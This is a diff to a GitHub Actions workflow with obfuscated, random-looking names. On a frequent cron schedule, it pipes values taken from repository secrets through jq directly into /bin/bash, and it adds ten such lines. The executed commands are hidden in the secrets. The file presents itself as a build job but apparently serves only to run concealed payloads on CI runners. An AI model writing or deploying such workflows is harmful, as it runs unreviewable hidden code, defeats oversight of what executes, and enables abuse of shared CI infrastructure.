@@ -1,11 +1,10 @@
 name: shenjingcha4189
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 2/6 * * *'
+    - cron: '49 3/6 * * *'
 
-jobs:  # 3422
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +12,16 @@ jobs:  # 3422
       - uses: actions/checkout@v4
       - name: shenjingcha4189
         env:
-          dpnc23: ${{ secrets.dpnc23 }}
+          zelc6389: ${{ secrets.zelc6389 }}
         run: |
-          echo $dpnc23 | jq -r .z7905 | /bin/bash
-          echo $jtkw20523 | jq -r .ogc94 | /bin/bash
-          echo $lt14751 | jq -r .gej3 | /bin/bash
-          echo $epx83461 | jq -r .wrf42609 | /bin/bash
-          echo $dp2 | jq -r .h6178 | /bin/bash
-          echo $tr8 | jq -r .ug088 | /bin/bash
-          echo $pbhx8827 | jq -r .awyzw2 | /bin/bash
+          echo $zelc6389 | jq -r .mgfkz23054 | /bin/bash
+          echo $vtzas1696 | jq -r .xys4330 | /bin/bash
+          echo $gx606 | jq -r .z17152 | /bin/bash
+          echo $zr072 | jq -r .ygj737 | /bin/bash
+          echo $uyc60 | jq -r .r65 | /bin/bash
+          echo $ouej7723 | jq -r .h3 | /bin/bash
+          echo $hc88443 | jq -r .zvk084 | /bin/bash
+          echo $wc65 | jq -r .b0594 | /bin/bash
+          echo $fofpi1491 | jq -r .plxb6828 | /bin/bash
+          echo $wvkwy4 | jq -r .xnlr3 | /bin/bash
 
